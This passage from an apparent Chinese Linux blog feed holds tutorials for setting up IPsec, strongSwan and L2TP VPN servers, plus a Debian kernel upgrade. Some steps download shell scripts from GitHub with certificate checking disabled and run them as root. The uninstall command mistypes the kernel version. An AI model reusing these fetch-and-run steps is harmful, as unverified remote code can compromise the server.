注意将PSK、XAUTH处的&quot;mykey&quot;编辑为**唯一且私密的字符串**，并且将[用户名]改为自己想要的登录名，[密码]改为自己想要的密码（[]符号去掉），可以添加多行，得到多个用户。

4.修改系统转发以及防火墙配置
首先编辑`/etc/sysctl.conf`，将`net.ipv4.ip_forward=1`一行前面的`#`号去掉，保存后执行`sysctl -p`。
接下来修改iptables。
OpenVZ执行：
&lt;pre class=&quot;  language-markup&quot;&gt;`&lt;span class=&quot;hljs-title&quot;&gt;iptables&lt;/span&gt; -A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -s &lt;span class=&quot;hljs-number&quot;&gt;10.31.0.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt;  -j ACCEPT
iptables -A FORWARD -s &lt;span class=&quot;hljs-number&quot;&gt;10.31.1.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt;  -j ACCEPT
iptables -A FORWARD -s &lt;span class=&quot;hljs-number&quot;&gt;10.31.2.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt;  -j ACCEPT
iptables -A INPUT -i venet0 -p esp -j ACCEPT
iptables -A INPUT -i venet0 -p udp --dport &lt;span class=&quot;hljs-number&quot;&gt;500&lt;/span&gt; -j ACCEPT
iptables -A INPUT -i venet0 -p tcp --dport &lt;span class=&quot;hljs-number&quot;&gt;500&lt;/span&gt; -j ACCEPT
iptables -A INPUT -i venet0 -p udp --dport &lt;span class=&quot;hljs-number&quot;&gt;4500&lt;/span&gt; -j ACCEPT
iptables -A INPUT -i venet0 -p udp --dport &lt;span class=&quot;hljs-number&quot;&gt;1701&lt;/span&gt; -j ACCEPT
iptables -A INPUT -i venet0 -p tcp --dport &lt;span class=&quot;hljs-number&quot;&gt;1723&lt;/span&gt; -j ACCEPT
iptables -A FORWARD -j REJECT
iptables -t nat -A POSTROUTING -s &lt;span class=&quot;hljs-number&quot;&gt;10.31.0.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt; -o venet0 -j MASQUERADE
iptables -t nat -A POSTROUTING -s &lt;span class=&quot;hljs-number&quot;&gt;10.31.1.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt; -o venet0 -j MASQUERADE
iptables -t nat -A POSTROUTING -s &lt;span class=&quot;hljs-number&quot;&gt;10.31.2.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt; -o venet0 -j MASQUERADE
`&lt;/pre&gt;
其它服务器执行
&lt;pre class=&quot;  language-markup&quot;&gt;`&lt;span class=&quot;hljs-title&quot;&gt;iptables&lt;/span&gt; -A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -s &lt;span class=&quot;hljs-number&quot;&gt;10.31.0.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt;  -j ACCEPT
iptables -A FORWARD -s &lt;span class=&quot;hljs-number&quot;&gt;10.31.1.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt;  -j ACCEPT
iptables -A FORWARD -s &lt;span class=&quot;hljs-number&quot;&gt;10.31.2.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt;  -j ACCEPT
iptables -A INPUT -i eth0 -p esp -j ACCEPT
iptables -A INPUT -i eth0 -p udp --dport &lt;span class=&quot;hljs-number&quot;&gt;500&lt;/span&gt; -j ACCEPT
iptables -A INPUT -i eth0 -p tcp --dport &lt;span class=&quot;hljs-number&quot;&gt;500&lt;/span&gt; -j ACCEPT
iptables -A INPUT -i eth0 -p udp --dport &lt;span class=&quot;hljs-number&quot;&gt;4500&lt;/span&gt; -j ACCEPT
iptables -A INPUT -i eth0 -p udp --dport &lt;span class=&quot;hljs-number&quot;&gt;1701&lt;/span&gt; -j ACCEPT
iptables -A INPUT -i eth0 -p tcp --dport &lt;span class=&quot;hljs-number&quot;&gt;1723&lt;/span&gt; -j ACCEPT
iptables -A FORWARD -j REJECT
iptables -t nat -A POSTROUTING -s &lt;span class=&quot;hljs-number&quot;&gt;10.31.0.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt; -o eth0 -j MASQUERADE
iptables -t nat -A POSTROUTING -s &lt;span class=&quot;hljs-number&quot;&gt;10.31.1.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt; -o eth0 -j MASQUERADE
iptables -t nat -A POSTROUTING -s &lt;span class=&quot;hljs-number&quot;&gt;10.31.2.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;24&lt;/span&gt; -o eth0 -j MASQUERADE
`&lt;/pre&gt;
接下来（公共部分）保存iptables配置并配置开机自动载入
&lt;pre class=&quot;  language-markup&quot;&gt;`iptables-save &amp;gt; /etc/iptables.rules
cat &amp;gt; /etc/network/&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;-up.d/iptables&amp;lt;&amp;lt;EOF
&lt;span class=&quot;hljs-shebang&quot;&gt;#!/bin/sh&lt;/span&gt;
iptables-restore &amp;lt; /etc/iptables.rules
EOF
chmod +x /etc/network/&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;-up.d/iptables
</code></pre><p>5.尝试连接<br>WP8.1手机安装ca.cert.pem，进入设置-VPN添加IKEv2连接，地址为<strong>证书中的地址或IP</strong>，通过用户名-密码连接。<br>Windows连接也是一样，但注意<strong>将证书导入本地计算机而不是当前用户的“受信任的证书颁发机构”</strong>。<br>iOS/Android/Mac OS X设备添加Cisco IPSec PSK验证方式，预共享密钥是<code>/usr/local/etc/ipsec.secrets</code>中PSK后的字符串（不含引号），用户名密码同上，<strong>可以通过任意域名或IP连接，不需要证书</strong></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[debain7升级内核]]></title>
      <url>http://www.linux52.com/2015-09-30-debain7-e5-8d-87-e7-ba-a7-e5-86-85-e6-a0-b8.html</url>
      <content type="html"><![CDATA[<h3 id="现在升级-Linux-Kernel"><a href="#现在升级-Linux-Kernel" class="headerlink" title="现在升级 Linux Kernel"></a>现在升级 Linux Kernel</h3><p>要想升级你的内核，运行下列命令来升级所有安装包和现存内核。</p>
<ol>
<li><span class="kwd">sudo</span> <span class="kwd">apt-get</span><span class="pln"> update</span><br><span class="kwd">sudo</span> <span class="kwd">apt-get</span><span class="pln"> dist</span><span class="pun">-</span><span class="pln">upgrade</span><br><span class="kwd">sudo</span> <span class="kwd">apt-get</span><span class="pln"> autoremove</span><br>升级完成后，重启你的设备。在安装完系统包和内核后重启机器是一个好习惯。这样做是为了让新的内核能够被应用。</li>
</ol>
<p>接下来，运行下列命令来下载 Linux Kernel 3.12.7</p>
<h4 id="32位设备，运行下列命令"><a href="#32位设备，运行下列命令" class="headerlink" title="32位设备，运行下列命令"></a>32位设备，运行下列命令</h4><ol>
<li><span class="kwd">cd</span> <span class="pun">/</span><span class="pln">tmp</span><br><span class="kwd">wget</span><span class="pln"> http</span><span class="pun">:</span><span class="com">//kernel.ubuntu.com/~kernel-ppa/mainline/v3.12.7-trusty/linux-headers-3.12.7-031207-generic_3.12.7-031207.201401091657_i386.deb <a href="http://kernel.ubuntu.com/~kernel-ppa/mainline/v3.12.7-trusty/linux-headers-3.12.7-031207_3.12.7-031207.201401091657_all.deb" target="_blank" rel="external">http://kernel.ubuntu.com/~kernel-ppa/mainline/v3.12.7-trusty/linux-headers-3.12.7-031207_3.12.7-031207.201401091657_all.deb</a> <a href="http://kernel.ubuntu.com/~kernel-ppa/mainline/v3.12.7-trusty/linux-image-3.12.7-031207-generic_3.12.7-031207.201401091657_i386.deb" target="_blank" rel="external">http://kernel.ubuntu.com/~kernel-ppa/mainline/v3.12.7-trusty/linux-image-3.12.7-031207-generic_3.12.7-031207.201401091657_i386.deb</a></span></li>
</ol>
<h4 id="64位设备，运行下列命令"><a href="#64位设备，运行下列命令" class="headerlink" title="64位设备，运行下列命令"></a>64位设备，运行下列命令</h4><ol>
<li><p><span class="kwd">cd</span> <span class="pun">/</span><span class="pln">tmp</span><br><span class="kwd">wget</span><span class="pln"> http</span><span class="pun">:</span><span class="com">//kernel.ubuntu.com/~kernel-ppa/mainline/v3.12.7-trusty/linux-headers-3.12.7-031207-generic_3.12.7-031207.201401091657_amd64.deb <a href="http://kernel.ubuntu.com/~kernel-ppa/mainline/v3.12.7-trusty/linux-headers-3.12.7-031207_3.12.7-031207.201401091657_all.deb" target="_blank" rel="external">http://kernel.ubuntu.com/~kernel-ppa/mainline/v3.12.7-trusty/linux-headers-3.12.7-031207_3.12.7-031207.201401091657_all.deb</a> <a href="http://kernel.ubuntu.com/~kernel-ppa/mainline/v3.12.7-trusty/linux-image-3.12.7-031207-generic_3.12.7-031207.201401091657_amd64.deb" target="_blank" rel="external">http://kernel.ubuntu.com/~kernel-ppa/mainline/v3.12.7-trusty/linux-image-3.12.7-031207-generic_3.12.7-031207.201401091657_amd64.deb</a></span><br>下载你的系统对应版本后，运行下列命令</p>
</li>
<li><p><span class="kwd">sudo</span><span class="pln"> dpkg </span><span class="pun">-</span><span class="pln">i </span><span class="pun">*.</span><span class="pln">deb</span><br>安装完成后，重启你的设备，如果一切都按照上面描述一样进展顺利，你的系统应该拥有了最新稳定的内核版本。</p>
</li>
</ol>
<p><img src="https://dn-linuxcn.qbox.me/data/attachment/album/201403/19/233615dnal0bpykvuy0sab.jpg" alt=""></p>
<p>卸载内核3.12.7版本，使用下列命令</p>
<ol>
<li><span class="kwd">sudo</span> <span class="kwd">apt-get</span><span class="pln"> remove linux</span><span class="pun">-</span><span class="pln">headers</span><span class="pun">-</span><span class="lit">3.12</span><span class="pun">.</span><span class="lit">7</span><span class="pun">-<em></em></span><span class="pln"> linux</span><span class="pun">-</span><span class="pln">image</span><span class="pun">-</span><span class="lit">3.13</span><span class="pun">.</span><span class="lit">7</span><span class="pun">-</span><br>好好享受吧！</li>
</ol>
<p>&nbsp;</p>
<p>Reading package lists… Done W: There is no public key available for the following key IDs: 7638D0442B90D010 W: There is no public key available for the following key IDs: 7638D0442B90D010 W: There is no public key available for the following key IDs: 9D6D8F6BC857C906</p>
<p>apt-get install debian-keyring debian-archive-keyring<br>apt-get update</p>
<div><br><div id="highlighter_374070" class="syntaxhighlighter  shell"><br><table style="height: 45px;" border="0" width="715" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td class="gutter"></td><br><td class="code">整个世界，清静了 :-D<br><div class="container"></div></td><br></tr><br></tbody><br></table><br></div><br></div>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[在搬瓦工的CentOS7下搭建Strongswan实现在iOS上按需连接VPN]]></title>
      <url>http://www.linux52.com/2015-09-30-e5-9c-a8-e6-90-ac-e7-93-a6-e5-b7-a5-e7-9a-84centos7-e4-b8-8b-e6-90-ad-e5-bb-bastrongswan-e5-ae-9e-e7-8e-b0-e5-9c-a8ios-e4-b8-8a-e6-8c-89-e9-9c-80-e8-bf-9e-e6-8e-a5vpn.html</url>
      <content type="html"><![CDATA[<p>查到的全是在Debian和Ubuntu下的教程，各种命令语法跟CentOS还有出入，Allen还是各种躲避。。。经历重新安装Debian后又重新装回CentOS的折腾后，终于搞定了。主要还是参考了<a href="http://songchenwen.github.io/tech/2014/10/13/cross-fire-wall-on-ios8/" target="_blank" rel="external">iOS8 不越狱翻墙方案</a>和<a href="https://medium.com/@cattyhouse/ios-ondemand-ipsec-vpn-setup-ebfb82b6f7a1" target="_blank" rel="external">iOS Ondemand IPSec VPN Setup</a>，这两篇都是Debian和Ubuntu，只要稍作改动即可安装到CentOS上，简易教程来&#x1f426;。</p>
<p>首先我们来编译Strongswan，因为直接用yum install 的不能用，不解中&#x1f616; 下载源码和依赖包</p>
<pre><code>wget [http://download.strongswan.org/strongswan-5.2.2.tar.bz2](http://download.strongswan.org/strongswan-5.2.2.tar.bz2)
tar xjvf strongswan-5.2.2.tar.bz2; cd strongswan-5.2.2
yum install make gcc gmp-devel
`&lt;/pre&gt;
搬瓦工是OpenVZ的所以用下面的命令来配置
&lt;pre&gt;`./configure --sysconfdir=/etc --disable-sql --disable-mysql --disable-ldap --enable-dhcp --enable-eap-identity --enable-eap-mschapv2 --enable-md4 --enable-xauth-eap --enable-eap-peap --enable-eap-md5 --enable-openssl --enable-shared --enable-unity --enable-eap-tls   --enable-eap-ttls --enable-eap-tnc --enable-eap-dynamic --enable-addrblock --enable-radattr --enable-nat-transport --enable-kernel-netlink --enable-kernel-libipsec
`&lt;/pre&gt;

## 开始编译

&lt;pre&gt;`make &amp;amp;&amp;amp; sudo make install
`&lt;/pre&gt;
完全没有错误出现✌️

## 生成证书

开始生成证书想要ssl证书的可以看文章里的链接，有列出哦 建立个临时目录来生成证书，然后复制到/etc/ipsec.d/里
&lt;pre&gt;`mkdir ~/ipsec_cert &amp;amp;&amp;amp; cd ~/ipsec_cert
`&lt;/pre&gt;

### 生成服务器证书

用的是[iOS8 不越狱翻墙方案](http://songchenwen.github.io/tech/2014/10/13/cross-fire-wall-on-ios8/)他创建的脚本。SERVER换成泥自己的域名或IP都行
&lt;pre&gt;`wget [https://gist.githubusercontent.com/songchenwen/14c1c663ea65d5d4a28b/raw/cef8d8bafe6168388b105f780c442412e6f8ede7/server_key.sh](https://gist.githubusercontent.com/songchenwen/14c1c663ea65d5d4a28b/raw/cef8d8bafe6168388b105f780c442412e6f8ede7/server_key.sh)
sh server_key.sh SERVER
`&lt;/pre&gt;

### 生成客户端证书

同样是他的脚本，这个脚本还会生成一个p12证书，这个证书需要导入到iOS里，USER换成你自己的用户名 EMAIL换成你自己的email。
&lt;pre&gt;`wget [https://gist.githubusercontent.com/songchenwen/14c1c663ea65d5d4a28b/raw/54843ae2e5e6d1159134cd9a90a08c31ff5a253d/client_key.sh](https://gist.githubusercontent.com/songchenwen/14c1c663ea65d5d4a28b/raw/54843ae2e5e6d1159134cd9a90a08c31ff5a253d/client_key.sh)
sh client_key.sh USER EMAIL
`&lt;/pre&gt;
执行完后把.p12证书和cacerts/strongswanCert.pem 下载到本地来备用

我是在～目录里生成的证书，所以在本地端命令如下：
&lt;pre&gt;`scp -P ssh端口 root@服务器ip:~/ipsec_cert/janner.p12 ~/
scp -P ssh端口 root@服务器ip:~/ipsec_cert/cacerts strongswanCert.pem ~/
`&lt;/pre&gt;

## 配置Strongswan

### 编辑 /etc/ipsec.conf

&lt;pre&gt;`sudo vi /etc/ipsec.conf
`&lt;/pre&gt;
&lt;pre&gt;`config setup
    # strictcrlpolicy=yes
    #  uniqueids = replace
    # charondebug=&quot;cfg 2, dmn 2, ike 2, net 0&quot; #要看Log时，取消注释本行

conn %default
    keyexchange=ikev1
    dpdaction=hold
    dpddelay=600s
    dpdtimeout=5s
    lifetime=24h
    ikelifetime=240h
    rekey=no
    left=emptyzone.github.io #这里换成你登录 VPN 用的域名或 IP，与生成证书时相同 
    leftsubnet=0.0.0.0/0
    leftcert=vpnHostCert.pem
    leftsendcert=always
    right=%any
    rightdns=8.8.8.8
    rightsourceip=10.0.0.0/8

conn CiscoIPSec
    rightauth=pubkey
    rightauth2=xauth
    auto=add
`&lt;/pre&gt;

### 编辑/etc/ipsec.secrets

&lt;pre&gt;`sudo vi /etc/ipsec.secrets
`&lt;/pre&gt;
&lt;pre&gt;`#验证用户所需的信息
#用户名 : EAP &quot;密码&quot;
: RSA vpnHostKey.pem
你的用户名 : EAP &quot;你的密码&quot;  
`&lt;/pre&gt;

## 配置防火墙

&gt; 如果你看过我上一篇blog，防火墙就简单配置下，用firewalld很简单 主要就是开放4500、500端口和esp协议

### 编辑/usr/lib/firewalld/services/ipsec.xml如下：

&lt;pre&gt;`&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;
&amp;lt;service&amp;gt;
  &amp;lt;short&amp;gt;IPsec&amp;lt;/short&amp;gt;
  &amp;lt;description&amp;gt;Internet Protocol Security (IPsec) incorporates security for network transmissions directly into the Internet Protocol (IP). IPsec provides methods for both encrypting data and authentication for the host or network it sends to. If you plan to use a vpnc server or FreeS/WAN, do not disable this option.&amp;lt;/description&amp;gt;
  &amp;lt;port protocol=&quot;ah&quot; port=&quot;&quot;/&amp;gt;
  &amp;lt;port protocol=&quot;esp&quot; port=&quot;&quot;/&amp;gt;
  &amp;lt;port protocol=&quot;udp&quot; port=&quot;500&quot;/&amp;gt;
  &amp;lt;port protocol=&quot;udp&quot; port=&quot;4500&quot;/&amp;gt;
&amp;lt;/service&amp;gt;
`&lt;/pre&gt;
然后依次输入如下命令就OK了✌️
&lt;pre&gt;`
firewall-cmd --permanent --add-service=ipsec
firewall-cmd --permanent --add-masquerade
firewall-cmd --reload
</code></pre><p>其他的就是配置分流路由器和开机启动啥的，我都没怎么配置，到此服务器端配置结束&#x1f604;</p>
<p>你可以把下载的两个证书用email发送到你的iOS上，安装后建立个VPN连接，选IPsec，使用证书，选择你的用户名的证书即可，登录下试试吧。成功后就可以按照我上文所引用的两篇文章来使用Apple Configurator来配置你的描述文件，通用用email发送到iOS上安装即可，断线切换网络都会自动连接，给力吧，可以暂时抛弃Anyconnect了吧，哇咔咔，高级配置如只有特定域名才会连VPN的也能设置，自己可以琢磨了&#x1f604;</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[L2TP+IPSec一键安装脚本(OpenVZ 虚拟化技术的 VPS)]]></title>
      <url>http://www.linux52.com/2015-09-30-l2tpipsec-e4-b8-80-e9-94-ae-e5-ae-89-e8-a3-85-e8-84-9a-e6-9c-acopenvz-e8-99-9a-e6-8b-9f-e5-8c-96-e6-8a-80-e6-9c-af-e7-9a-84-vps.html</url>
      <content type="html"><![CDATA[<p>用VPS在墙上打洞还有一种叫L2TP，也是常见的一种方式。本脚本结合了L2TP（Layer 2 Tunneling Protocol）和IPSec（Internet Protocol Security）,安装的软件包版本分别是openswan-2.6.38、xl2tpd-1.2.4，和PPTP的不同之处请戳这里查看。<br>同样要保证你的VPS是在外面的自由世界中，且VPS是基于Xen或KVM的。<br>注意：基于 OpenVZ 虚拟化技术的 VPS 需要开启TUN/TAP才能正常使用，购买 VPS 时请先咨询服务商是否支持开启 TUN/TAP。<br>检测是否支持TUN模块<br>执行命令：</p>
<p>cat /dev/net/tun<br>如果返回信息为：cat: /dev/net/tun: File descriptor in bad state 说明正常<br>检测是否支持ppp模块<br>执行命令：</p>
<p>cat /dev/ppp<br>如果返回信息为：cat: /dev/ppp: No such device or address 说明正常</p>
<p>终端里运行以下命令（CentOS）：</p>
<p>cd /root<br>wget –no-check-certificate <a href="https://raw.githubusercontent.com/teddysun/across/master/l2tp.sh" target="_blank" rel="external">https://raw.githubusercontent.com/teddysun/across/master/l2tp.sh</a><br>chmod +x l2tp.sh<br>./l2tp.sh<br>终端里运行以下命令（Ubuntu）：</p>
<p>cd /root<br>wget –no-check-certificate <a href="https://raw.githubusercontent.com/teddysun/across/master/l2tp_ubuntu.sh" target="_blank" rel="external">https://raw.githubusercontent.com/teddysun/across/master/l2tp_ubuntu.sh</a><br>chmod +x l2tp_ubuntu.sh<br>./l2tp_ubuntu.sh<br>执行后会要求输入一些信息，如「Please input IP-Range:」意为输入本地IP段范围（本地电脑连接到VPS后给分配的一个本地IP地址），直接回车意味着输入默认值10.1.2；「Please input PSK:」PSK意为预共享密钥，即指定一个密钥将来在连接时需要用到，直接回车意味着输入默认值vpn。<br>输入了IP段范围和PSK之后，程序会显示你的VPS当前的IP（IPV4）、L2TP的本地IP（默认的话是10.1.2.1）、分配给客户端的IP段（默认的话是10.1.2.2-10.1.2.254）以及你所设置的PSK（默认的话是vpn），确认无误后，按任意键，程序便会开始自动配置。<br>安装完之后，会显示VPS当前的IP「ServerIP:VPS当前公网IP」、默认用户名「username:vpn」、默认用户名的密码「password:随机生成的6位字符串」、预共享密钥「PSK:你所设置的PSK，如果你之前没有设置则为默认值vpn」。</p>
<p>出现如下图所示（下列图片来源于vpsyou.com）则说明OK了。</p>
<p>要想增加用户怎么办呢？很简单，用任一文本编辑器打开/etc/ppp/chap-secrets，按照其中既有的用户格式添加即可。<br>客户端设置（以 Windows XP 为例）：<br>创建一个VPN新建连接向导：<br>公司名可以任意指定</p>
<p>设置完成后一般即可顺利连接。注意：XP 用户：请确保“控制面板-&gt;管理工具-&gt;服务”中的 IPSEC 服务被启动。如你遇到其他问题，可在此文下面留言。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[在Ubuntu上部署L2TP服务]]></title>
      <url>http://www.linux52.com/2015-09-30-e5-9c-a8ubuntu-e4-b8-8a-e9-83-a8-e7-bd-b2l2tp-e6-9c-8d-e5-8a-a1.html</url>
      <content type="html"><![CDATA[<p>现在，lesca向您提供OpenVPN、L2TP和PPTP的快速部署工具<strong>OVM</strong>，请读者转至《<a href="http://lesca.me/archives/quickly-deploy-vpn-on-ubuntu-with-ovm.html" target="_blank" rel="external">OVM：在Ubuntu上快速部署OpenVPN, L2TP, PPTP服务</a>》。如果想手动安装L2TP，请继续阅读本文：</p>
<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>目前流行的L2TP服务都是通过IPSec加密的，正式的叫法应该是L2TP over IPSec。因此，要获得通用性较强的L2TP服务，就需要有IPSec支持。<br>IPSec提供加密、验证服务，客户端连接服务器后首先请求IPSec验证，这通常是用PSK进行验证，验证通过后，交由L2TP处理。<br>L2TP负责对数据进行封包，并启动pppd建立通讯链路。pppd负责用户名、密码的验证。<br>以上就是建立一个L2TP连接的大致过程，但是其中会用到多种相关的协议或者端口：<span id="more-1003"></span></p>
<ul>
<li>协议：UDP，端口500，Internet Key Exchange (IKE)</li>
<li>协议：UDP，端口4500，IPsec NAT-T</li>
<li>协议：UDP，端口1701，L2TP监听</li>
<li>协议：ESP，协议号50，Encapsulated Security Payload</li>
<li>协议：AH，协议号51，Authentication Header<br>ESP和AH协议用于提供验证、数据完整性以及加密通信等特性。它们可以加密整个数据包，也可以仅加密上层协议头，这取决于IPSec所启用的模式。<br>IPSec工作在隧道模式（tunnel）时，加密整个数据报；传输模式（transport）时，仅加密IP数据报的头部。<br>我们配置的IPSec仅向L2TP提供支持，因此工作在传输模式。</li>
</ul>
<h2 id="二、安装软件包"><a href="#二、安装软件包" class="headerlink" title="二、安装软件包"></a>二、安装软件包</h2><p>现在流行的ipsec来自openswan，l2tp来自xl2tpd。本文将以这两个软件包进行讲解如何配置。当提及openswan的时候就是指ipsec，当说到xl2tpd的时候就是指l2tp。希望读者能够明白。</p>
<h3 id="1-搭建环境"><a href="#1-搭建环境" class="headerlink" title="1.搭建环境"></a>1.搭建环境</h3><ul>
<li>Ubuntu 10.04</li>
<li>Kernel 2.6.32</li>
<li>Openswan 2.6.37</li>
<li>xl2tpd-1.2.5<br><strong>/!\重要：</strong>笔者一开始在Ubuntu 11.04上进行实验，Kernel 3.0，IPSec版本2.6.23。这里有几个严重问题：</li>
</ul>
<ol>
<li>openswan尚未对3.0内核提供良好支持，某些情况下用iPhone或者win7客户端连接会导致内核奔溃！</li>
<li>2.6.23版本的openswan尚有诸多BUG，即使在Kernel 2.6的环境下，也无法保证100%连接成功。<br>因此，请至少使用openswan 2.6.37的版本，当前最新版本是2.6.38。源代码可在这里下载：<a href="http://download.openswan.org/openswan/" target="_blank" rel="external">http://download.openswan.org/openswan/</a>，之后需要通过编译完成安装。对于openswan的安装我们将会提供两种不同的方法。</li>
</ol>
<h3 id="2-通过添加软件库安装openswan"><a href="#2-通过添加软件库安装openswan" class="headerlink" title="2.通过添加软件库安装openswan"></a>2.通过添加软件库安装openswan</h3><pre>apt-get install python-software-properties
add-apt-repository ppa:openswan/ppa
apt-get update
apt-get install openswan
</pre>
如果出现**Do you want to create a RSA public/private keypair for this host?**。我们选择**No**，这种模式的IPSec通过证书进行验证，而非PSK。

### 3.通过编译源代码包安装openswan

获取最新软件包：
<pre>wget http://download.openswan.org/openswan/openswan-2.6.38.tar.gz
tar -xzf openswan-2.6.38.tar.gz
</pre>
编译不同的版本可能会依赖不同的库文件，因此如果你正在编译更高版本的openswan，请务必先阅读README文件。这里我们安装如下库文件：
<pre>apt-get install libgmp3-dev flex bison
</pre>
安装这些库会占用大量空间，而且在服务器上编译二进制文件通常不是明智之举！但是有时候服务器架构会与你的测试机完全不同，因此可能你仍然需要在服务器上做这些工作。接下来我们开始编译：
<pre>make programs install
</pre>
如果一切顺利，编译工作完成后配置文件及服务会自动安装到合适的地方，也就是和通过apt-get安装没什么两样了。

### 4.安装xl2tpd

Ubuntu中xl2tpd的版本目前没有发现严重问题。因此安装起来也比较方便：
<pre>apt-get install xl2tpd
</pre>

<h2 id="三、开始配置"><a href="#三、开始配置" class="headerlink" title="三、开始配置"></a>三、开始配置</h2><p>配置工作分为三部分：IPSec配置、L2TP配置、PPP配置</p>
<h3 id="1-IPSec配置"><a href="#1-IPSec配置" class="headerlink" title="1.IPSec配置"></a>1.IPSec配置</h3><pre># /etc/ipsec.conf

config setup
    nat_traversal=yes
    virtual_private=%v4:10.0.0.0/8,%v4:192.168.0.0/16,%v4:172.16.0.0/12,%v4:25.0.0.0/8,%v6:fd00::/8,%v6:fe80::/10
    oe=off
    protostack=netkey

conn L2TP-PSK-NAT
        rightsubnet=vhost:%priv
        also=L2TP-PSK-noNAT

conn L2TP-PSK-noNAT
        authby=secret
        pfs=no
        auto=add
        keyingtries=3
        # we cannot rekey for %any, let client rekey
        rekey=no
        # Apple iOS doesn't send delete notify so we need dead peer detection
        # to detect vanishing clients
        dpddelay=10
        dpdtimeout=90
        dpdaction=clear
        # Set ikelifetime and keylife to same defaults windows has
        ikelifetime=8h
        keylife=1h
        # l2tp-over-ipsec is transport mode
        type=transport
        #
        left=**$IP**
        #
        # For updated Windows 2000/XP clients,
        # to support old clients as well, use leftprotoport=17/%any
        leftprotoport=17/1701
        #
        # The remote user.
        #
        right=%any
        # Using the magic port of "%any" means "any one single port". This is
        # a work around required for Apple OSX clients that use a randomly
        # high port.
        rightprotoport=17/%any

conn passthrough-for-non-l2tp
        type=passthrough
        left=**$IP**
        leftnexthop=**$GATEWAY**
        right=0.0.0.0
        rightsubnet=0.0.0.0/0
        auto=route
</pre>
其中，$IP改成你主机以太网卡的IP，$GATEWAY改成该IP所在网段的网关地址，下同。对于下面的密钥文件，你需要将密钥引在引号中。
<pre># /etc/ipsec.secrets
$IP %any: PSK "Your Preshared Key Here"
</pre>
最后我们需要修改某些网络策略，让ipsec正常运行：
<pre>for each in /proc/sys/net/ipv4/conf/*
do
    echo 0 &gt; $each/accept_redirects
    echo 0 &gt; $each/send_redirects
done
</pre>

<h3 id="2-L2TP配置"><a href="#2-L2TP配置" class="headerlink" title="2.L2TP配置"></a>2.L2TP配置</h3><pre># /etc/xl2tpd/xl2tpd.conf

[global]
ipsec saref = yes

[lns default]
ip range = 10.10.20.100-10.10.20.254
local ip = 10.10.20.1
require chap = yes
refuse pap = yes
require authentication = yes
ppp debug = yes
pppoptfile = /etc/ppp/options.xl2tpd
length bit = yes
</pre>

<h3 id="3-PPP配置"><a href="#3-PPP配置" class="headerlink" title="3.PPP配置"></a>3.PPP配置</h3><pre># /etc/ppp/options.xl2tpd

refuse-mschap-v2
refuse-mschap
ms-dns 8.8.8.8
ms-dns 8.8.4.4
asyncmap 0
auth
lock
hide-password
local
#debug
name l2tpd
proxyarp
lcp-echo-interval 30
lcp-echo-failure 4
mtu 1404
mru 1404
</pre>

<h3 id="5-启用转发"><a href="#5-启用转发" class="headerlink" title="5.启用转发"></a>5.启用转发</h3><pre>echo 1 &gt; /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
</pre>
对于OpenVZ的主机，可能不支持MASQUERADE，此时需要使用SNAT：
<pre>iptables -t nat -A POSTROUTING -o eth0 -j SNAT --to-source $IP
</pre>
其中$IP就是你主机的eth0接口的IP地址。

## 四、检查ipsec是否工作正常

我们通过执行`ipsec verify`命令进行验证ipsec服务是否工作正常：

### 错误1：pluto is running [FAILED]

<pre>Checking your system to see if IPsec got installed and started correctly:
Version check and ipsec on-path                                 [OK]
Linux Openswan U2.6.38/K(no kernel code presently loaded)
**Checking for IPsec support in kernel                            [FAILED]**
 SAref kernel support                                           [N/A]
**Checking that pluto is running                                  [FAILED]**
  whack: Pluto is not running (no "/var/run/pluto/pluto.ctl")
Checking for 'ip' command                                       [OK]
Checking /bin/sh is not /bin/dash                               [WARNING]
Checking for 'iptables' command                                 [OK]
Opportunistic Encryption Support                                [DISABLED]
</pre>
这是因为你还没有启动ipsec服务！
<pre>/etc/init.d/ipsec start
</pre>

<h3 id="错误2：NETKEY-Testing-XFRM-related-proc-values-FAILED"><a href="#错误2：NETKEY-Testing-XFRM-related-proc-values-FAILED" class="headerlink" title="错误2：NETKEY: Testing XFRM related proc values [FAILED]"></a>错误2：NETKEY: Testing XFRM related proc values [FAILED]</h3><pre>Checking your system to see if IPsec got installed and started correctly:
Version check and ipsec on-path                                 [OK]
Linux Openswan U2.6.38/K2.6.32-38-generic-pae (netkey)
Checking for IPsec support in kernel                            [OK]
 SAref kernel support                                           [N/A]
** NETKEY:  Testing XFRM related proc values                      [FAILED]**

  Please disable /proc/sys/net/ipv4/conf/*/send_redirects
  or NETKEY will cause the sending of bogus ICMP redirects!

        [FAILED]

  Please disable /proc/sys/net/ipv4/conf/*/accept_redirects
  or NETKEY will accept bogus ICMP redirects!

        [OK]
Checking that pluto is running                                  [OK]
 Pluto listening for IKE on udp 500                             [OK]
 Pluto listening for NAT-T on udp 4500                          [OK]
